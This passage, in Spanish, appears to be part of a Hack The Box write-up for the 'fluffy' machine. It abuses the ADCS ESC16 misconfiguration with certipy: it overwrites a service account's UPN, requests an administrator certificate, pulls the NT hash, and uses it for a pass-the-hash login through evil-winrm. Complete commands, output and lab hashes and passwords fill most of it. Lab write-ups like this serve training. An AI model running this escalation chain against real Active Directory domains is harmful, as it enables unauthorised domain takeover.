[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767
```

- Tenemos el hash NTLM `33bd09dcd697600edf6b3a7af4875767` para la cuenta winrm_svc.

Con la cuenta **winrm_svc** nos podemos conectar por winrm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ evil-winrm -i fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767

Evil-WinRm* PS C:\Users\winrm_svc\Desktop> typee user.txt 
e3f68cd8************************
```

### Abusando de ESC16 ADCS.

Sin mucha mas informacion puedo tratar de enumerar los certificados que cada cuenta puede solicitar.

- En este caso, enumeré las plantillas de certificados vulnerables que el usuario **ca_svc** puede solicitar.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ certipy find -u ca_svc@fluffy.htb -hashes ":ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip 10.129.65.160 -stdout -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

- Podemos ver que la autoridad certificadora **fluffy-DC01-CA** es vulnerable a ESC16.

Podemos utilizar [CertipyPrivEscWiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) para ver como abusar de ESC16.

ESC16 ocurre cuando **Active Directory permite mapear certificados a cuentas usando atributos controlables por el atacante**, como:

- `userPrincipalName (UPN)`
- `mail`
- `altSecurityIdentities`

Para abusar de ESC16 requiero que una cuenta tenga permisos **GenericWrite** sobre la cuenta victima.

- En este caso **p.agila** tiene permisos **GenericWrite** sobre la cuenta ca_svc.

Primero tengo que modificar el UPN de la cuenta victima por el del usuario que quiero suplantar, en este caso administrator.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy]
└─$ certipy account \
    -u 'p.agila@fluffy.htb' -p 'prometheusx-303' \
    -dc-ip '10.129.65.160' -upn 'administrator' \
    -user 'ca_svc' update
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

- Ahora puedo solicitar un certificado para el usuario **administrator**. 

```bash 
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy/loot]
└─$ certipy req -u 'ca_svc@fluffy.htb' \ -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 \ -ca 'fluffy-DC01-CA'

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 17
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

- Por ultimo tengo que restablecer el UPN original.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy/loot]
└─$ certipy account \
    -u 'p.agila@fluffy.htb' -p 'prometheusx-303' \
    -dc-ip '10.129.65.160' -upn 'ca_svc@fluffy.htb' \
    -user 'ca_svc' update
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

Con el certificado puedo autenticarme como administrator y obtener el hash NTLM.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy/loot]
└─$ certipy auth \
    -dc-ip '10.129.65.160' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'fluffy.htb'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

Con el hash puedo hacer Pass The Hash y conectarme por WinRm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/fluffy/loot]
└─$ evil-winrm -i fluffy.htb -u administrator -H "8da83a3fa618b6e3a00e93f676c92a6e"

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fluffy\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
928d5d6294e92e2c*****
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

***PWNED***

![](assets/Pasted%20image%2020260117235724.png)

